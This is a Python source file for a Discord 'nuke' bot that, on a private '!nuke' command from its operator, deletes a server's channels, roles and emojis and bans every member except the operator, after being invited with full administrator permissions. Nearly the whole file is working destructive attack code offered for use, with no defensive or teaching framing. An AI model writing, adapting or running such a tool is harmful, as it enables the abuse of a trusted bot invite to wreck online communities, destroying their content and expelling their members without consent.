# https://discord.com/api/oauth2/authorize?client_id=812936328001355807&permissions=8&scope=bot
import discord

bot = discord.Client()

async def nuke(ID):
    guild = bot.get_guild(ID)
    print(f'Name: {guild.name}')

    try:
        print('Deleting channels')
        for i in guild.channels:
			# Put a channel ID here to white list it
            if (i.id == 69696969):
                continue
            await i.delete()
    except:
        pass

    try:
        print('Deleting roles')
        for i in guild.roles:
            await i.delete()
    except:
        pass

    try:
        print('Deleting emojis')
        for i in guild.emojis:
            await i.delete()
    except:
        pass

    try:
        print('Banning current members')
        for i in guild.members:
			# put your user ID here to not get banned
            if (i.id == 696969):
                continue
            await i.ban()
    except:
        pass

    print('Done\n')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}#{bot.user.discriminator}')

@bot.event
async def on_message(message):
	# Put your user ID here so only you can submit commands
    if message.author.id != 696969696969:
        return

    if '!nuke' in message.content and isinstance(message.channel, discord.channel.DMChannel):
        id = int(message.content.split()[1])
        print(f'Nuking A Server\n')
        await nuke(id)

bot.run('')